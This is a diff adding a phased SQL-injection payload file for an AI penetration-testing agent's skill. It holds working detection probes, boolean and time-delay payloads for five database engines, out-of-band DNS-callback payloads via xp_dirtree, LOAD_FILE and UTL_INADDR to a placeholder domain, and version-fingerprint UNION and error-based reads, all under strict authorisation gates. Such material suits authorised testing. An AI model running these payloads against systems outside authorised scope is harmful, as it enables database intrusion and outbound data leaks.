@@ -1,0 +1,255 @@
+# SQL injection payload corpus for skills/sql-injection/SKILL.md — one
+# file, four phases.
+#
+# This file has four sections, separated by banners below. They carry
+# different authorization requirements even though they're in one file:
+#
+#   - Phase 1 (top section): no checkpoint beyond normal scope
+#     confirmation. Syntax-sensitivity probes only — used to see whether
+#     the input is parsed as part of a query at all.
+#
+#   - Phase 2 section: boolean-, error-, and time-based confirmation
+#     probes, covering MySQL, Postgres, MSSQL, Oracle, and SQLite. Still
+#     non-destructive and non-extractive; used to turn a Phase 1 signal
+#     into a repeatable, confirmed result. See SKILL.md "Engine
+#     identification" before picking which engine's payloads to try —
+#     don't fire every engine's syntax at the same live target
+#     speculatively.
+#
+#   - Phase 2D section: out-of-band (DNS/HTTP callback) confirmation.
+#     Requires its OWN separate ask_user authorization (including the
+#     specific callback domain to use) — distinct from and in addition to
+#     Phase 3's authorization. Only use after 2a/2b/2c have all been tried
+#     and were inconclusive. Never use a public/shared third-party OOB
+#     service without explicit user confirmation that it's in scope.
+#
+#     IMPORTANT — CURRENT KAGENT CAPABILITY:
+#     KAgent currently does not expose an OOB callback/listener tool.
+#     Therefore Phase 2D payloads MUST NOT be executed in the current
+#     runtime. Do not invoke them through shell, http, or another
+#     substitute mechanism. They are retained only as future payload
+#     definitions for an environment that provides an approved OOB
+#     callback capability — see SKILL.md "Phase 2d capability check".
+#
+#   - Phase 3 section: requires a separate, additional ask_user
+#     authorization, obtained after SQL injection is already confirmed at
+#     SQLI-2. Reading further into this file for an earlier phase does not
+#     grant permission to use a later section. Per SKILL.md, Phase 3 never
+#     runs automatically just because its payloads happen to be in the
+#     same file you already read — see SKILL.md "Relationship to
+#     payloads.txt" for how gating and payload content are deliberately
+#     kept separate.
+#
+# Only use the section that matches the phase you are currently
+# authorized for. Do not skip ahead because a later section is visible in
+# the same file. None of these payloads perform UNION-based column/table
+# enumeration or data extraction — that stays out of scope for this
+# corpus regardless of phase.
+#
+# Annotation convention (applies to every payload in every section below):
+# each payload line is followed by a comment giving (a) its purpose, (b)
+# the condition under which it applies, and (c) any limit on what it may
+# be used for. This is kept consistent across Phase 1, 2, 2D, and 3 so the
+# level of context doesn't drop off in later sections.
+
+# ============================================================================
+# ========================== PHASE 1 — DETECTION =============================
+# ============================================================================
+# Syntax-sensitivity probes only. These probes are intended to test parser
+# sensitivity and syntax boundaries; they are not intended to extract,
+# modify, or enumerate application data. (Note: some of these — e.g. `;`
+# and `--` — can still change how the parser terminates or comments out the
+# remainder of a statement, which is exactly the syntax-boundary signal
+# being tested for; that is distinct from deliberately injecting query
+# logic, which starts in Phase 2.)
+
+'                           # purpose: single quote, classic string-context break | applies: any string-context parameter | limit: syntax probe only, no query logic injected
+"                           # purpose: double quote, for double-quoted string contexts | applies: params rendered in double-quoted SQL strings | limit: syntax probe only
+')                          # purpose: closing paren + quote, for function-wrapped params, e.g. WHERE id=('$id') | applies: params passed through a SQL function wrapper | limit: syntax probe only
+")                          # purpose: double-quote variant of the above | applies: same as above, double-quoted variant | limit: syntax probe only
+`                           # purpose: backtick, MySQL identifier-quote context | applies: MySQL-suspected targets or unknown engine | limit: syntax probe only
+;                           # purpose: statement terminator, some drivers/engines surface a distinct error | applies: any candidate; also used to gauge stacked-query support | limit: syntax probe only, do not chain a second statement here
+--                          # purpose: inline comment marker, checks whether the rest of the query is swallowed | applies: any candidate | limit: syntax probe only
+%27                         # purpose: URL-encoded single quote, for params that get decoded before reaching the query layer | applies: params that appear to be double-decoded or pass through an encoding layer | limit: syntax probe only
+
+# --- Engine fingerprinting — extended reference (indicators only, not exploit payloads) ---
+# Use this table to narrow down the engine before selecting Phase 2
+# payloads, per SKILL.md "Engine identification". These are recognition
+# signals — function names, concatenation syntax, comment syntax — not
+# payloads to inject for effect. Pair with the error-string reference
+# below when a probe does produce a visible error.
+#
+# Engine     | Function-based tell               | String concatenation      | Comment syntax
+# -----------|-------------------------------------|----------------------------|----------------
+# MySQL      | version(), database(), user()       | CONCAT(a,b) or a||b*       | -- , #, /* */
+# Postgres   | version(), current_database()        | a || b                     | -- , /* */
+# MSSQL      | @@version, DB_NAME()                 | a + b                      | -- , /* */
+# Oracle     | banner from v$version, USER          | a || b                     | -- , /* */
+# SQLite     | sqlite_version()                     | a || b                     | -- , /* */
+# * MySQL only treats || as concatenation in PIPES_AS_CONCAT sql_mode; CONCAT() is the reliable default.
+#
+# These indicators are for identification only — do not use a
+# function-based tell as a live extraction probe outside of the Phase 3
+# fingerprint reads further down this file.
+
+# Error-string reference (for engine identification — see SKILL.md):
+#   MySQL:    "SQL syntax.*MySQL", "Warning: mysqli"
+#   Postgres: "pg_query", "PostgreSQL.*ERROR", "SQLSTATE"
+#   MSSQL:    "Microsoft OLE DB", "Unclosed quotation mark", "System.Data.SqlClient"
+#   Oracle:   "ORA-\d{5}"
+#   SQLite:   "SQLite3::", "sqlite3.OperationalError"
+
+# --- Quoted-string vs. numeric context — try both if unclear ---
+# Per SKILL.md 1b: if the parameter's data type/context isn't already
+# clear (e.g. an ID that always renders as a bare number vs. a value
+# rendered inside quotes elsewhere in the app), don't guess which context
+# applies — try one quoted-string-style probe and one bare-numeric probe
+# as a pair, and record which one produced a signal in the result's
+# `injection_context` field. See the paired boolean examples in Phase 2
+# below (`1 AND 1=1` vs `1' AND '1'='1`) for the standard pairing to reuse
+# here at the syntax-detection stage too, substituted with the Phase 1
+# quote/paren probes above instead of full boolean logic.
+
+# ============================================================================
+# ========================== PHASE 2 — VALIDATION ============================
+# ============================================================================
+# Boolean-, error-, and time-based confirmation. These change query logic
+# (TRUE/FALSE conditions, deliberate delays) but do not read, modify, or
+# exfiltrate any data. Use the pair together and compare against baseline;
+# a one-off difference is not evidence — repeat before concluding.
+
+# --- Boolean-based (engine-agnostic, try first) -----------------------------
+1 AND 1=1                  # purpose: boolean TRUE, numeric context | applies: should behave like baseline if injectable and the app is filtering rows | limit: confirmation only, no data read
+1 AND 1=2                  # purpose: boolean FALSE, numeric context | applies: should differ from baseline/TRUE if injectable | limit: confirmation only, no data read
+1' AND '1'='1              # purpose: boolean TRUE, quoted-string context | applies: use when parameter is rendered inside quotes | limit: confirmation only, no data read
+1' AND '1'='2              # purpose: boolean FALSE, quoted-string context | applies: pairs with the TRUE variant above | limit: confirmation only, no data read
+1 OR 1=1                   # purpose: alternate TRUE form | applies: only if AND-form was inconclusive, some WHERE clauses behave differently under OR | limit: confirmation only, no data read
+
+# --- Time-based, per engine (pick ONE engine per "Engine identification") ---
+# NOTE — stacked queries: every payload below that uses a leading `;` is a
+# stacked (multi-statement) form. It only works if the application's
+# driver/connection is configured to permit multiple statements per query
+# — many are not (e.g. most PHP mysqli/PDO defaults, many ORMs). A stacked
+# payload that produces no delay and no error is NOT evidence against SQL
+# injection — it may simply mean stacked queries aren't permitted here. If
+# a stacked time-based probe is inconclusive, don't treat that as a
+# negative on its own; fall back to boolean-based (above) or, if
+# available, an in-line (non-stacked) time-based form for the same engine
+# before concluding "not confirmed" for this technique.
+
+# MySQL
+1;SELECT SLEEP(5)--        # purpose: 5s delay | applies: MySQL, stacked queries permitted | limit: confirmation only, bounded fixed delay
+1;SELECT SLEEP(0)--        # purpose: 0s control, must NOT show the delay | applies: same as above, run alongside the 5s probe | limit: control only
+
+# Postgres
+1;SELECT pg_sleep(5)--     # purpose: 5s delay | applies: Postgres, stacked queries permitted | limit: confirmation only, bounded fixed delay
+1;SELECT pg_sleep(0)--     # purpose: 0s control | applies: same as above | limit: control only
+
+# MSSQL
+1;WAITFOR DELAY '0:0:5'--  # purpose: 5s delay | applies: MSSQL, stacked queries permitted | limit: confirmation only, bounded fixed delay
+1;WAITFOR DELAY '0:0:0'--  # purpose: 0s control | applies: same as above | limit: control only
+
+# Oracle (no native SLEEP; use DBMS_LOCK or a heavy deterministic wait
+# already scoped to a bounded, known cost — do NOT substitute an
+# unbounded/recursive query here)
+1;BEGIN DBMS_LOCK.SLEEP(5); END;--   # purpose: 5s delay | applies: Oracle, requires EXECUTE on DBMS_LOCK | limit: confirmation only, bounded fixed delay
+1;BEGIN DBMS_LOCK.SLEEP(0); END;--   # purpose: 0s control | applies: same as above | limit: control only
+# If DBMS_LOCK is unavailable or unauthorized (e.g. the probe errors with
+# insufficient privileges rather than timing out), do not substitute an
+# expensive recursive/heavy query as a workaround. Fall back to
+# boolean-based validation (above) instead.
+
+# SQLite: no native SLEEP()-equivalent. Do not attempt to fabricate a delay
+# via recursive/heavy queries — that risks unintended load or denial of
+# service on the target. If the engine is SQLite, rely on boolean-based
+# (above) or OOB (Phase 2D, if the capability exists and is authorized)
+# instead. See SKILL.md 2b note.
+
+# ============================================================================
+# ==================== PHASE 2D — OUT-OF-BAND (GATED) ========================
+# ============================================================================
+# NOTE:
+# KAgent currently has no OOB callback/listener tool.
+# These payloads must not be executed in the current environment.
+# They are retained only for future OOB capability support.
+# Never execute them through shell or another substitute mechanism.
+#
+# Requires its own, separate ask_user authorization, obtained AFTER 2a/2b/2c
+# have all been tried and were inconclusive. The authorization must include
+# the specific callback domain to use — never substitute a public/shared
+# third-party OOB service without explicit confirmation it's in scope.
+#
+# Replace {TOKEN} with a unique, randomly generated subdomain label per
+# probe (e.g. an 8-character hex string) so a resulting callback can be
+# attributed to the exact probe that caused it. Replace {CALLBACK_DOMAIN}
+# with the authorized domain provided by the user. Send once, then poll the
+# listener for a hit against that exact token within a reasonable window
+# (e.g. 30–60s). A matching callback = positive (SQLI-2). No callback =
+# negative for this technique. Do not retry the same payload repeatedly on
+# a negative result — a single well-formed attempt per candidate is enough
+# to conclude for this technique.
+
+# MySQL (requires FILE priv or a UDF path in some configs — try only the
+# basic form; do not chain into file read/write if it fails)
+1;SELECT LOAD_FILE(CONCAT('\\\\',(SELECT '{TOKEN}'),'.{CALLBACK_DOMAIN}\\a'))--  # purpose: DNS-callback confirmation via UNC path | applies: MySQL with FILE priv, capability-gated (currently unavailable) | limit: binary confirmation only, never chain into file read/write
+
+# MSSQL (xp_dirtree / xp_fileexist trigger a UNC lookup -> DNS)
+1;EXEC master..xp_dirtree '\\{TOKEN}.{CALLBACK_DOMAIN}\a'--  # purpose: DNS-callback confirmation via UNC path | applies: MSSQL, capability-gated (currently unavailable) | limit: binary confirmation only
+
+# Postgres (via copy/program is extraction-adjacent and OUT of scope here;
+# use a DNS-triggering extension only if already present and confirmed
+# non-extractive, e.g. dblink to a hostname that resolves through the
+# callback domain — treat as engine-specific and confirm applicability
+# before using)
+# (no engine-agnostic safe default provided; consult user before improvising)
+
+# Oracle (UTL_HTTP / UTL_INADDR trigger outbound resolution)
+1 AND UTL_INADDR.get_host_address('{TOKEN}.{CALLBACK_DOMAIN}') IS NOT NULL--  # purpose: DNS-callback confirmation via outbound resolution | applies: Oracle, capability-gated (currently unavailable) | limit: binary confirmation only
+
+# SQLite: no native outbound network capability from SQL itself in most
+# embedded contexts — Phase 2D is typically not applicable to SQLite
+# targets. If the application layer proxies SQLite results through
+# something that makes outbound calls, that's an application-level
+# behavior outside this skill's SQL-injection-specific scope; note it in
+# results.md rather than improvising a payload here.
+
+# ============================================================================
+# ============ everything below this line is PHASE 3 — IMPACT ===============
+# ============================================================================
+# Do not use without explicit ask_user authorization obtained after SQL
+# injection has already been confirmed at SQLI-2 above (via 2a, 2b, or,
+# once available and authorized, 2d).
+# Merely having read this far into the file is not authorization to run
+# anything below this banner. See SKILL.md "Relationship to payloads.txt"
+# and the Phase 3 contract box in SKILL.md for the exact bound: a single
+# fingerprint value, nothing more.
+#
+# Every payload here reads a single, non-sensitive, engine-identifying
+# value — never user data, never credentials, never a UNION-based
+# column/table walk. Retrieve only the one value needed to demonstrate
+# impact; do not chain into a broader read "just to be thorough."
+#
+# Use only when the confirmed injection context and response shape already
+# permit a single-value fingerprint read without exploratory column/table
+# enumeration. Do not probe column counts broadly, and do not iterate
+# UNION SELECT NULL,NULL,... attempts to discover the column count — if the
+# column count isn't already known from the confirmed injection context,
+# treat that as this technique not being cleanly applicable here and fall
+# back to an error-based single-value read (e.g. the MSSQL CONVERT or
+# MySQL extractvalue forms below) instead of enumerating.
+
+1 UNION SELECT version()--                          # purpose: single-column version/banner read | applies: MySQL/Postgres, only when column count/shape already known from confirmed injection context | limit: one fingerprint value only, never used to enumerate columns
+1 AND 1=CONVERT(int, @@version)--                    # purpose: forces the version string into an error message | applies: MSSQL, error-based single-value read | limit: one fingerprint value only
+1' AND extractvalue(1, concat(0x7e, version()))--   # purpose: XPath-error-based single-value extraction | applies: MySQL | limit: one fingerprint value only
+1 UNION SELECT banner FROM v$version--                # purpose: version banner read | applies: Oracle, same column-count caveat as above | limit: one fingerprint value only
+1 UNION SELECT sqlite_version()--                     # purpose: version read | applies: SQLite, same column-count caveat as above | limit: one fingerprint value only
+
+# Note: this file intentionally does not include payloads for table/column
+# enumeration, credential or session-token extraction, or full-row dumps at
+# any phase. That kind of extraction is out of scope for this skill
+# entirely (see "Bound the proof" in SKILL.md) — it is not something that
+# becomes available under Phase 2D or Phase 3 authorization either. If a
+# specific, narrowly-scoped additional read beyond a version/fingerprint
+# value or a binary OOB confirmation is genuinely needed, ask_user for that
+# as its own, separately justified step rather than reaching for broader
+# extraction by default.
